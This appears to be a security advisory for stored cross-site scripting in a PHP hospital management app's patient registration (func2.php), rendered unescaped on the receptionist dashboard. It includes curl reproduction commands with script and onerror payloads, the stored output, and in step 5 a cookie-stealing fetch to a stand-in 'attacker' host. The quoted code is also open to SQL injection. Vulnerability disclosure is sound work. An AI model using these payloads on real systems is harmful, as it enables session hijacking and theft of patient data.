### Title

Stored XSS in `func2.php` patient registration executes arbitrary JavaScript in the receptionist's browser

### Summary

The patient registration form (`func2.php` handler for `patsub1`) persists the `fname`, `lname`, `gender`, `email`, and `contact` fields without HTML escaping. The receptionist dashboard (`admin-panel1.php` Patient List tab) renders those columns verbatim inside table cells. Any anonymous visitor can therefore register a patient with `fname=<script>alert(1)</script>` and the script runs in the receptionist's browser whenever the Patient List tab is loaded. The session cookie is not marked `HttpOnly`, so the script can exfiltrate the cookie and hijack the receptionist session.

### Affected Version

Commit: `bc3bb9cbadfb2b1afb36660b5119ff42a03a7a25`

### Vulnerability Type

Stored Cross-Site Scripting (CWE-79)

### Affected Code

File: `func2.php`

```php
$fname=$_POST['fname'];
$lname=$_POST['lname'];
$gender=$_POST['gender'];
$email=$_POST['email'];
$contact=$_POST['contact'];
$password=$_POST['password'];
$cpassword=$_POST['cpassword'];
if($password==$cpassword){
    $query="insert into patreg(fname,lname,gender,email,contact,password,cpassword) values ('$fname','$lname','$gender','$email','$contact','$password','$cpassword');";
    $result=mysqli_query($con,$query);
}
```

File: `admin-panel1.php` (Patient List tab, around line 326)

```php
$query = "select * from patreg";
$result = mysqli_query($con,$query);
while ($row = mysqli_fetch_array($result)){
    echo "<tr>
        <td>$pid</td>
        <td>$fname</td>
        <td>$lname</td>
        <td>$gender</td>
        <td>$email</td>
        <td>$contact</td>
        <td>$password</td>
    </tr>";
}
```

### Root Cause

`func2.php` runs `session_start()` so a successful registration logs the user into the patient dashboard, but the input values are inserted into the database without any HTML escaping. `admin-panel1.php` echoes the stored values directly inside HTML using PHP short-echo tags or string interpolation, so any markup in the stored values is rendered as HTML in the receptionist's browser.

### Steps to Reproduce

1. Deploy the application and set `BASE_URL`.

```bash
BASE_URL="http://hms.localhost"
```

2. Register a new patient whose `fname` and `lname` contain script payloads. The form does not require a session.

```bash
curl -sS -i "$BASE_URL/func2.php" \
  --data-urlencode "patsub1=1" \
  --data-urlencode "fname=<script>alert('XSS-fname')</script>" \
  --data-urlencode "lname=<img src=x onerror=alert('XSS-lname')>" \
  --data-urlencode "gender=Male" \
  --data-urlencode "email=evil@xss.com" \
  --data-urlencode "contact=1234567890" \
  --data-urlencode "password=evil123" \
  --data-urlencode "cpassword=evil123"
```

Observed response (302 redirect to `admin-panel.php`):

```text
HTTP/1.1 302 Found
Location: admin-panel.php
```

3. Confirm the values are stored verbatim:

```bash
mysql --socket=/tmp/mysql.sock -uroot myhmsdb -e "SELECT pid,fname,lname,email FROM patreg WHERE email='evil@xss.com';"
```

```text
pid            fname                                lname                                email
13             <script>alert('XSS-fname')</script> <img src=x onerror=alert('XSS-lname')> evil@xss.com
```

4. The receptionist dashboard renders the stored values verbatim:

```bash
curl -sS "$BASE_URL/admin-panel1.php" \
  | grep -E "<script|onerror" | head -10
```

```html
<td><script>alert('XSS-fname')</script></td>
<td><img src=x onerror=alert('XSS-lname')></td>
```

5. In a real browser, opening the Patient List tab fires the two `<script>`/`<img>` payloads in the receptionist's origin. The non-`HttpOnly` `PHPSESSID` cookie is therefore readable from JavaScript and can be exfiltrated with `fetch('http://attacker/?c='+document.cookie)`.

### Impact

Stored XSS in patient registration lets any anonymous visitor run arbitrary JavaScript in the receptionist's browser:

- The receptionist session is fully privileged (view every patient, doctor, appointment, prescription, contact message; add and delete doctors).
- The `PHPSESSID` cookie is not marked `HttpOnly`, so the XSS can directly steal it and impersonate the receptionist outside the browser.
- The same payload persists forever in `patreg` and will fire every time the receptionist reloads the Patient List tab.
- The same value is also echoed by `patientsearch.php`, so an attacker who knows a contact number can trigger the XSS in the receptionist's browser by searching for that contact.

### CVSS 3.1

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
Score: 9.0 (Critical)
```
